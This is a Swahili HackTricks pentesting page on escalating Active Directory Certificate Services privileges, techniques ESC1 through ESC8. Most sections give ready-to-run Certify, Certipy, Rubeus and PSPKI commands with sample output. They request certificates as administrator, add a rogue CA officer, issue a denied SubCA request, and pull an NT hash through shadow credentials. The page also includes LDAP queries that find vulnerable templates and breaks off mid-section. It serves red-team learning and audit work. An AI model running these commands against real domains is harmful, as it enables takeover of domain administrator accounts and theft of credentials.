# AD CS Kupanda Kwa Kikoa

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Hii ni muhtasari wa sehemu za mbinu za kupanda kwa kiwango cha machapisho:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Vigezo Visivyofaa vya Cheti Vilivyopangwa - ESC1

### Maelezo

### Vigezo Visivyofaa vya Cheti Vilivyopangwa - ESC1 Imeelezwa

* **Haki za usajili zinatolewa kwa watumiaji wenye mamlaka ya chini na Enterprise CA.**
* **Idhini ya meneja haihitajiki.**
* **Hakuna saini kutoka kwa wafanyakazi walioruhusiwa inahitajika.**
* **Maelezo ya usalama kwenye templeti za cheti ni ya kutosha, kuruhusu watumiaji wenye mamlaka ya chini kupata haki za usajili.**
* **Templeti za cheti zimepangwa kufafanua EKUs ambazo hufanikisha uwakilishi:**
* Kitambulisho cha Upanuzi wa Kitumizi (EKU) kama vile Uthibitishaji wa Mteja (OID 1.3.6.1.5.5.7.3.2), Uthibitishaji wa Mteja wa PKINIT (1.3.6.1.5.2.3.4), Kuingia kwa Kadi ya Akili (OID 1.3.6.1.4.1.311.20.2.2), Kusudi Lolote (OID 2.5.29.37.0), au hakuna EKU (SubCA) zimejumuishwa.
* **Uwezo wa waombaji kuongeza subjectAltName kwenye Ombi la Kusaini Cheti (CSR) unaruhusiwa na templeti:**
* Active Directory (AD) inapendelea subjectAltName (SAN) kwenye cheti kwa uthibitisho wa kitambulisho ikiwepo. Hii inamaanisha kwamba kwa kutoa SAN katika CSR, cheti kinaweza kuombwa kujifanya kuwa mtumiaji yeyote (kwa mfano, msimamizi wa kikoa). Ikiwa waombaji wanaweza kutoa SAN inaonyeshwa kwenye kitu cha AD cha templeti ya cheti kupitia mali ya `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu maelezo ya SAN kutolewa na mwombaji.

{% hint style="danger" %}
Usanidi ulioelezewa unaruhusu watumiaji wenye mamlaka ya chini kuomba vyeti vyenye SAN yoyote wanayotaka, kuruhusu uthibitisho kama mwakilishi yeyote wa kikoa kupitia Kerberos au SChannel.
{% endhint %}

Kipengele hiki mara nyingine kinaamilishwa ili kusaidia uzalishaji wa vyeti vya HTTPS au mwenyeji kwa bidhaa au huduma za kupelekwa, au kutokana na ukosefu wa ufahamu.

Inafahamika kuwa kuunda cheti na chaguo hili kunasababisha onyo, ambalo sio kesi wakati templeti ya cheti iliyopo (kama templeti ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyowezeshwa) inadondoshwa na kisha kuhaririwa kuongeza OID ya uthibitisho.

### Matumizi Mabaya

Ili **kupata templeti za cheti zilizo hatarini** unaweza kukimbia:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Kutumia udhaifu huu kwa lengo la kujifanya kuwa msimamizi, mtu anaweza kufanya yafuatayo:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha cheti kilichozalishwa kuwa muundo wa `.pfx` na kutumia kujiandikisha tena kwa kutumia Rubeus au certipy:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Majalibinari za Windows "Certreq.exe" na "Certutil.exe" zinaweza kutumika kuzalisha PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uchambuzi wa templeti za vyeti ndani ya mpangilio wa AD Forest, hasa zile ambazo hazihitaji idhini au saini, zikiwa na EKU ya Uthibitishaji wa Mteja au Kadi ya Akili ya Kuingia, na na bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyowezeshwa, unaweza kufanywa kwa kukimbia swali la LDAP lifuatalo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Vigezo vya Cheti vilivyopangwa vibaya - ESC2

### Maelezo

Skenario ya unyanyasaji wa pili ni tofauti kidogo na ya kwanza:

1. Haki za usajili zinatolewa kwa watumiaji wenye mamlaka ya chini na Enterprise CA.
2. Mahitaji ya idhini ya meneja yamelemazwa.
3. Mahitaji ya saini zilizoidhinishwa yamepuuzwa.
4. Msimbo wa usalama uliopitiliza kwenye kigezo cha cheti unatoa haki za usajili wa cheti kwa watumiaji wenye mamlaka ya chini.
5. **Kigezo cha cheti kimeainishwa kuwa na EKU ya Kusudi Lolote au hakuna EKU.**

EKU ya **Kusudi Lolote** inaruhusu cheti kupatikana na mshambuliaji kwa **kila kusudi**, ikiwa ni pamoja na uthibitishaji wa mteja, uthibitishaji wa seva, saini ya nambari, n.k. **Mbinu ile ile inayotumiwa kwa ESC3** inaweza kutumika kufaidika na hali hii.

Cheti **bila EKUs**, ambacho kinatenda kama cheti cha CA ya msaidizi, kinaweza kutumiwa kwa **kila kusudi** na **pia kinaweza kutumika kusaini vyeti vipya**. Hivyo, mshambuliaji anaweza kubainisha EKUs au sehemu zisizo na kikomo katika vyeti vipya kwa kutumia cheti cha CA ya msaidizi.

Hata hivyo, vyeti vipya vilivyoundwa kwa **uthibitishaji wa kikoa** havitafanya kazi ikiwa cheti cha CA ya msaidizi hakiaminiwi na kitu cha **`NTAuthCertificates`**, ambacho ni mipangilio ya msingi. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani za cheti zisizo na kikomo. Hivi vinaweza **kutumiwa vibaya** kwa madhumuni mbalimbali (kama vile saini ya nambari, uthibitishaji wa seva, n.k.) na inaweza kuwa na athari kubwa kwa programu nyingine kwenye mtandao kama vile SAML, AD FS, au IPSec.

Ili kuchunguza mifano ya vigezo inayolingana na hali hii ndani ya mpangilio wa AD Forest, swali la LDAP lifuatalo linaweza kutekelezwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Vigezo vilivyopangwa vibaya vya Mifano ya Mawakala wa Usajili - ESC3

### Maelezo

Hali hii ni kama ya kwanza na ya pili lakini **inatumia** **EKU tofauti** (Mwombaji wa Cheti Mawakala) na **mifano 2 tofauti** (hivyo ina vigezo 2 vya mahitaji),

EKU ya **Mwombaji wa Cheti** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Mawakala wa Usajili** katika nyaraka za Microsoft, inaruhusu mhusika kujiandikisha kwa **cheti** kwa niaba ya mtumiaji mwingine.

**"mawakala wa usajili"** wanajiandikisha kwenye **mfano** kama huo na kutumia **cheti kilichopatikana kuweka saini ya pamoja kwenye CSR kwa niaba ya mtumiaji mwingine**. Kisha **inatuma** CSR iliyosainiwa pamoja kwa CA, ikijiandikisha kwenye **mfano** ambao **unaruhusu "kujiandikisha kwa niaba ya"**, na CA inajibu na **cheti kinachomilikiwa na mtumiaji "mwingine"**.

**Mahitaji 1:**

- Haki za usajili zinatolewa kwa watumiaji wenye mamlaka ya chini na CA ya Kampuni.
- Mahitaji ya idhini ya meneja yameachwa.
- Hakuna mahitaji ya saini halali.
- Descripta ya usalama ya mfano wa cheti inaruhusu sana, ikitoa haki za usajili kwa watumiaji wenye mamlaka ya chini.
- Mfano wa cheti unajumuisha EKU ya Mwombaji wa Cheti, kuruhusu ombi la mifano mingine ya cheti kwa niaba ya wahusika wengine.

**Mahitaji 2:**

- CA ya Kampuni inatoa haki za usajili kwa watumiaji wenye mamlaka ya chini.
- Idhini ya meneja inapuuzwa.
- Toleo la schema ya mfano ni 1 au linazidi 2, na inabainisha Mahitaji ya Utoaji wa Sera ya Maombi ambayo inahitaji EKU ya Mwombaji wa Cheti.
- EKU iliyoelezwa kwenye mfano wa cheti inaruhusu uwakilishi wa kikoa.
- Vizuizi kwa mawakala wa usajili havijatekelezwa kwenye CA.

### Matumizi mabaya

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kwa matumizi mabaya ya hali hii:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Watumiaji** ambao wameruhusiwa **kupata** cheti cha wakala wa usajili, templeti ambazo mawakala wa usajili wanaruhusiwa kusajili, na akaunti kwa niaba ya ambayo wakala wa usajili anaweza kufanya kazi inaweza kudhibitiwa na CAs ya kampuni. Hii inafanikiwa kwa kufungua `certsrc.msc` **snap-in**, **bonyeza kulia kwenye CA**, **bonyeza Mipangilio**, na kisha **navigating** kwenye kichupo cha "Mawakala wa Usajili".

Hata hivyo, imebainika kuwa mipangilio ya msingi ya CAs ni "**Usizuie mawakala wa usajili**." Wakati kizuizi kwenye mawakala wa usajili kinapowezeshwa na wahariri, kikiwekwa kama "Zuia mawakala wa usajili," mpangilio wa msingi bado ni wa kuruhusu sana. Inaruhusu **Kila mtu** kupata usajili kwenye templeti zote kama yeyote.

## Udhibiti wa Upatikanaji wa Cheti Wenye Mabomu - ESC4

### **Maelezo**

Maelezo ya usalama kwenye templeti za cheti yanafafanua ruhusa maalum ambazo **misingi ya AD** inamiliki kuhusu templeti.

Ikiwa **mshambuliaji** ana ruhusa zinazohitajika za **kubadilisha** templeti na kutekeleza mianya yoyote inayoweza kudukuliwa iliyoelezwa katika **sehemu za awali**, kuongeza mamlaka kunaweza kurahisishwa.

Ruhusa muhimu zinazohusiana na templeti za cheti ni pamoja na:

- **Mmiliki:** Inatoa udhibiti wa moja kwa moja juu ya kitu, kuruhusu kubadilisha sifa yoyote.
- **KudhibitiKamili:** Inawezesha mamlaka kamili juu ya kitu, ikiwa ni pamoja na uwezo wa kubadilisha sifa yoyote.
- **AndikaMmiliki:** Inaruhusu kubadilisha mmiliki wa kitu kuwa misingi chini ya udhibiti wa mshambuliaji.
- **AndikaDacl:** Inaruhusu kurekebisha udhibiti wa upatikanaji, ikiruhusu mshambuliaji KudhibitiKamili.
- **AndikaMali:** Inaidhinisha kuhariri mali yoyote ya kitu.

### Matumizi Mabaya

Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati mtumiaji ana ruhusa za kuandika juu ya templeti ya cheti. Hii inaweza kutumiwa, kwa mfano, kubadilisha mazingira ya templeti ya cheti ili kufanya templeti kuwa na mianya ya ESC1.

Kama tunavyoona kwenye njia hapo juu, ni `JOHNPC` tu anaye na ruhusa hizi, lakini mtumiaji wetu `JOHN` ana uhusiano mpya wa `AddKeyCredentialLink` kwa `JOHNPC`. Kwa kuwa mbinu hii inahusiana na vyeti, nimeitekeleza shambulio hili pia, ambalo linajulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna kidokezo kidogo cha amri ya `shadow auto` ya Certipy ya kupata NT hash ya mwathiriwa.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha mazingira ya kigezo cha cheti kwa amri moja. Kwa **chaguo-msingi**, Certipy ita **badilisha** mazingira ili kuifanya iwe **hatarini kwa ESC1**. Tunaweza pia kutoa **`-save-old` parameter ili kuokoa mazingira ya zamani**, ambayo itakuwa muhimu kwa ajili ya **kurejesha** mazingira baada ya shambulio letu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kudhibiti Upatikanaji wa Vitu Hatarishi vya PKI - ESC5

### Maelezo

Mtandao mpana wa uhusiano wa ACL, ambao unajumuisha vitu kadhaa zaidi ya templeti za vyeti na mamlaka ya vyeti, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri usalama kwa kiasi kikubwa, ni pamoja na:

* Kifaa cha kompyuta cha AD cha seva ya CA, ambacho kinaweza kudukuliwa kupitia mbinu kama S4U2Self au S4U2Proxy.
* Seva ya RPC/DCOM ya seva ya CA.
* Kifaa au chombo chochote cha AD kinachoshuka au chombo ndani ya njia maalum ya chombo `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini sio tu, vyombo na vitu kama chombo cha Templeti za Vyeti, chombo cha Mamlaka za Uthibitishaji, kitu cha NTAuthCertificates, na chombo cha Huduma za Usajili.

Usalama wa mfumo wa PKI unaweza kudukuliwa ikiwa mshambuliaji mwenye mamlaka ya chini anafanikiwa kupata udhibiti juu ya sehemu yoyote ya vitu muhimu hivi.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyozungumziwa katika [**chapisho la CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Wakati hii inapowezeshwa kwenye Mamlaka ya Uthibitishaji (CA), inaruhusu ujumuishaji wa **thamani zilizoundwa na mtumiaji** katika **jina mbadala la somo** kwa **ombi lolote**, ikiwa ni pamoja na lile lililoundwa kutoka kwa Active Directory®. Kwa hivyo, hii inaruhusu **mshambuliaji** kujiandikisha kupitia **templeti yoyote** iliyoanzishwa kwa **uthibitishaji** wa kikoa - hasa zile zinazoruhusu usajili wa watumiaji wasio na mamlaka, kama templeti ya Mtumiaji ya kawaida. Kama matokeo, cheti linaweza kusajiliwa, kuruhusu mshambuliaji kujithibitisha kama msimamizi wa kikoa au **kitu kingine chochote** kilichopo ndani ya kikoa.

**Note**: Njia ya kuongeza **majina mbadala** katika Ombi la Kusaini Cheti (CSR), kupitia hoja ya `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama "Name Value Pairs"), inaleta **tofauti** na mkakati wa kudukua SANs katika ESC1. Hapa, tofauti iko katika **jinsi habari ya akaunti inavyofungwa** - ndani ya sifa ya cheti, badala ya kipengele.

### Matumizi Mabaya

Ili kuthibitisha ikiwa mipangilio imewezeshwa, shirika linaweza kutumia amri ifuatayo na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Uendeshaji huu kimsingi hutumia **upatikanaji wa usajili wa mbali**, hivyo, njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zina uwezo wa kugundua hitilafu hii ya usanidi na kuitumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Kuwezesha mabadiliko haya, ikiaminika kuwa mtu ana **mamlaka ya utawala wa kikoa** au sawa nayo, amri ifuatayo inaweza kutekelezwa kutoka kwenye kituo chochote cha kazi:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Kuongeza usanidi huu katika mazingira yako, bendera inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Baada ya sasisho za usalama za Mei 2022, vyeti vipya vilivyotolewa vitakuwa na kipengele cha usalama kinachojumuisha mali ya "objectSid" ya mwombaji. Kwa ESC1, SID hii inatokana na SAN iliyospecifywa. Hata hivyo, kwa ESC6, SID inafanana na "objectSid" ya mwombaji, sio SAN.\
Ili kutumia ESC6, ni muhimu kwa mfumo kuwa na udhaifu wa ESC10 (Udhaifu wa Mappings za Cheti Dhaifu), ambayo inapendelea SAN kuliko kipengele kipya cha usalama.
{% endhint %}

## Udhibiti wa Upatikanaji wa Mamlaka ya Cheti Inayoweza Kudhurika - ESC7

### Shambulio 1

#### Maelezo

Udhibiti wa upatikanaji wa mamlaka ya cheti unadhibitiwa kupitia seti ya ruhusa ambazo zinaongoza vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kupata `certsrv.msc`, kubonyeza kulia CA, kuchagua mali, na kisha kusafiri kwenye kichupo cha Usalama. Aidha, ruhusa zinaweza kuhesabiwa kwa kutumia moduli ya PSPKI na amri kama vile:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa ufahamu juu ya haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, inayohusiana na majukumu ya "msimamizi wa CA" na "Meneja wa Cheti" mtawaliwa.

#### Matumizi Mabaya

Kuwa na haki za **`ManageCA`** kwenye mamlaka ya cheti inawezesha mtu kuuweka mipangilio kwa mbali kwa kutumia PSPKI. Hii ni pamoja na kubadilisha bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu maelezo ya SAN kwenye templeti yoyote, ambayo ni sehemu muhimu ya kuongeza hadhi ya kikoa.

Urahisishaji wa mchakato huu unaweza kufanikiwa kwa kutumia amri ya **Enable-PolicyModuleFlag** ya PSPKI, kuruhusu marekebisho bila mwingiliano wa moja kwa moja wa GUI.

Umiliki wa haki za **`ManageCertificates`** unawezesha kuidhinisha maombi yanayosubiri, kwa kuzingilia "idhini ya meneja wa cheti wa CA".

Unganisho wa moduli za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua cheti:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Shambulizi 2

#### Maelezo

{% hint style="warning" %}
Katika **shambulizi la awali**, **ruhusa ya Kusimamia CA** ilitumiwa kuwezesha bendera ya **EDITF\_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza shambulizi la **ESC6**, lakini hii haitakuwa na athari yoyote hadi huduma ya CA (`CertSvc`) irejeshwe. Wakati mtumiaji ana haki ya ufikiaji wa **Kusimamia CA**, mtumiaji pia anaruhusiwa **kuanzisha upya huduma**. Walakini, hii **haitoi maana kwamba mtumiaji anaweza kuanzisha upya huduma kwa mbali**. Zaidi ya hayo, **ESC6 huenda isifanye kazi kwa urahisi** katika mazingira mengi yaliyosasishwa kutokana na sasisho za usalama za Mei 2022.
{% endhint %}

Kwa hivyo, shambulizi lingine linawasilishwa hapa.

Mahitaji:

* **Ruhusa ya Kusimamia CA** pekee
* **Ruhusa ya Kusimamia Vyeti** (inaweza kutolewa kutoka kwa **Kusimamia CA**)
* Kigezo cha cheti cha **SubCA** lazima kiwe **kimeidhinishwa** (inaweza kuwezeshwa kutoka kwa **Kusimamia CA**)

Mbinu hii inategemea ukweli kwamba watumiaji wenye haki ya ufikiaji wa **Kusimamia CA** _na_ **Kusimamia Vyeti** wanaweza **kutoa maombi ya cheti yaliyoshindwa**. Kigezo cha cheti cha **`SubCA`** kina **mdhaifu wa ESC1**, lakini **waendeshaji tu** wanaweza kujiandikisha kwenye kigezo hicho. Kwa hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha kwenye **`SubCA`** - ambayo itakuwa **imekataliwa** - lakini **baadaye itatolewa na meneja**.

#### Matumizi mabaya

Unaweza **kujipatia haki ya ufikiaji wa `Kusimamia Vyeti`** kwa kuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Kigezo cha **`SubCA`** kinaweza kuwezeshwa kwenye CA kwa kutumia parameter ya `-enable-template`. Kwa chaguo-msingi, kigezo cha `SubCA` kimezimuliwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumekidhi mahitaji ya shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na kigezo cha `SubCA`**.

**Ombi hili litakataliwa**, lakini tutahifadhi ufunguo wa kibinafsi na kumbuka kitambulisho cha ombi.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa kutumia **`Manage CA` na `Manage Certificates`** zetu, tunaweza kisha **kutoa ombi la cheti lililoshindwa** kwa kutumia amri ya `ca` na parameter ya `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na mwishowe, tunaweza **kupata cheti kilichotolewa** kwa kutumia amri ya `req` na kipengele cha `-retrieve <ID ya ombi>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay hadi Kwenye Ncha za HTTP za AD CS - ESC8

### Maelezo

{% hint style="info" %}
Katika mazingira ambapo **AD CS imefungwa**, ikiwa kuna **ncha ya uandikishaji wa wavuti inayoweza kudhurika** na angalau **templeti moja ya cheti imechapishwa** ambayo inaruhusu **uandikishaji wa kompyuta ya kikoa na uwakilishi wa mteja** (kama vile templeti ya cheti ya **`Machine`** ya chaguo-msingi), inawezekana kwa **kompyuta yoyote na huduma ya spooler kuwa hatarini kwa shambulizi la mshambuliaji**!
{% endhint %}

Kuna **njia kadhaa za uandikishaji zinazotegemea HTTP** zinazoungwa mkono na AD CS, zinapatikana kupitia majukumu ya seva ya ziada ambayo wasimamizi wanaweza kufunga. Miunganisho hii ya wavuti kwa uandikishaji wa cheti kwa kutumia HTTP inaweza kuwa hatarini kwa **mashambulizi ya NTLM relay**. Mshambuliaji, kutoka kwenye **kompyuta iliyodukuliwa, anaweza kujifanya kuwa akaunti yoyote ya AD inayothibitisha kupitia NTLM ya kuingia**. Wakati akiiga akaunti ya mwathirika, miunganisho hii ya wavuti inaweza kufikiwa na mshambuliaji kuomba cheti cha uwakilishi wa mteja kwa kutumia templeti za cheti za `User` au `Machine`.

* Kiolesura cha **uandikishaji wa wavuti** (programu ya zamani ya ASP inayopatikana kwa `http://<caserver>/certsrv/`), kwa chaguo-msingi inatumia HTTP tu, ambayo haipatii ulinzi dhidi ya mashambulizi ya NTLM relay. Aidha, inaruhusu tu uwakilishi wa NTLM kupitia kichwa cha HTTP cha Uthibitishaji, ikifanya njia za uwakilishi salama zaidi kama Kerberos kutotumika.
* Huduma ya **Uandikishaji wa Cheti** (CES), Huduma ya **Sera ya Uandikishaji wa Cheti** (CEP), na Huduma ya **Uandikishaji wa Kifaa cha Mtandao** (NDES) kwa chaguo-msingi inasaidia uwakilishi wa mazungumzo kupitia kichwa chao cha HTTP cha Uthibitishaji. Uwakilishi wa mazungumzo **unasaidia** Kerberos na **NTLM**, kuruhusu mshambuliaji **kudhoofisha hadi NTLM** wakati wa mashambulizi ya relay. Ingawa huduma hizi za wavuti zinaunga mkono HTTPS kwa chaguo-msingi, HTTPS pekee **haitoi ulinzi dhidi ya mashambulizi ya NTLM relay**. Ulinzi dhidi ya mashambulizi ya NTLM relay kwa huduma za HTTPS ni muhimu tu wakati HTTPS inachanganywa na kufunga kifungo. Kwa bahati mbaya, AD CS haiwezi kuamsha Ulinzi Mpana kwa Uthibitishaji kwenye IIS, ambayo inahitajika kwa kifungo cha kifaa.

Shida ya kawaida ya mashambulizi ya NTLM relay ni **muda mfupi wa vikao vya NTLM** na uwezo mdogo wa mshambuliaji kuingiliana na huduma zinazohitaji **saini ya NTLM**.

Walakini, kikwazo hiki kinashindwa kwa kudukua shambulizi la NTLM relay ili kupata cheti kwa mtumiaji, kwani muda wa halali wa cheti unadhibiti muda wa kikao, na cheti kinaweza kutumika na huduma zinazohitaji **saini ya NTLM**. Kwa maelekezo juu ya kutumia cheti lililorudishwa, tazama:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Kizuizi kingine cha mashambulizi ya NTLM relay ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe na akaunti ya mwathirika**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uwakilishi huu:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Matumizi Mabaya**

[**Certify**](https://github.com/GhostPack/Certify)'s `cas` inataja **ncha za HTTP za AD CS zilizowezeshwa**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Mali ya `msPKI-Enrollment-Servers` hutumiwa na Mamlaka za Cheti za Kampuni (CAs) kuhifadhi vituo vya Huduma ya Usajili wa Cheti (CES). Vituo hivi vinaweza kuchambuliwa na kuorodheshwa kwa kutumia zana ya **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
